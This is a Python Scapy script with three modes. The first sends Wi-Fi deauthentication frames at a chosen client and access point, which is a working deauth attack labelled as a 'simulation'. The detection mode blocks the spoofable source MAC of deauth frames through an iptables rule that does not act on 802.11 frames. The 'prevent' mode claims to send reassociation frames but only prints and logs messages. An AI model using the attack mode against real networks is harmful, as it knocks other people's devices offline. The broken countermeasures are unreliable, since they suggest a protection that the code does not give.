from scapy.all import *
import os
import sys
import threading
import logging
import subprocess

# Configure logging
LOG_FILE = "deauth_attack_log.txt"
BLOCK_LIST_FILE = "blocked_devices.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

def block_attacker(mac_address):
    """Block detected attacker by adding them to the block list."""
    with open(BLOCK_LIST_FILE, "a") as f:
        f.write(mac_address + "\n")
    print(f"[+] Attacker {mac_address} added to block list.")
    logging.warning(f"Blocked attacker {mac_address}")
    
    # Example command to block MAC address (Linux-based systems)
    subprocess.call(["iptables", "-A", "INPUT", "-m", "mac", "--mac-source", mac_address, "-j", "DROP"])

def send_deauth_packets(target_mac, ap_mac, iface, count=100):
    """Simulate Wi-Fi deauthentication attack by sending deauth packets."""
    print(f"[+] Sending {count} deauthentication packets to target {target_mac} from AP {ap_mac} on interface {iface}")
    logging.info(f"Simulating deauth attack on {target_mac} from {ap_mac} using {iface}")
    
    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    
    for _ in range(count):
        sendp(deauth_packet, iface=iface, verbose=False)
    
    print("[+] Deauthentication attack simulation complete.")
    logging.info("Deauthentication attack simulation complete.")

def detect_deauth(iface):
    """Detect Wi-Fi deauthentication attacks on a given interface and block attackers."""
    print("[+] Monitoring for deauthentication attacks on", iface)
    logging.info("Started monitoring for deauthentication attacks.")
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Deauth):
            alert_msg = f"[!] Detected deauthentication attack from {pkt.addr2} targeting {pkt.addr1}"
            print(alert_msg)
            logging.warning(alert_msg)
            block_attacker(pkt.addr2)
    
    sniff(iface=iface, prn=packet_handler, store=False)

def prevent_deauth(iface):
    """Attempt to prevent deauthentication attacks by sending reassociation frames."""
    print("[+] Running countermeasures against deauthentication attacks")
    logging.info("Countermeasures initiated to prevent deauth attacks.")
    
    while True:
        print("[+] Sending reassociation requests to maintain connection")
        logging.info("Sent reassociation request to maintain connection.")
        time.sleep(10)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root.")
        sys.exit(1)
    
    mode = input("Choose mode (1: Simulate Attack, 2: Detect Attack, 3: Prevent Attack): ")
    iface = input("Enter network interface (e.g., wlan0mon): ")
    
    if mode == "1":
        target_mac = input("Enter target MAC address: ")
        ap_mac = input("Enter Access Point MAC address: ")
        count = int(input("Enter number of packets to send: "))
        send_deauth_packets(target_mac, ap_mac, iface, count)
    elif mode == "2":
        detect_deauth(iface)
    elif mode == "3":
        prevent_thread = threading.Thread(target=prevent_deauth, args=(iface,))
        prevent_thread.start()
    else:
        print("[-] Invalid option. Exiting.")
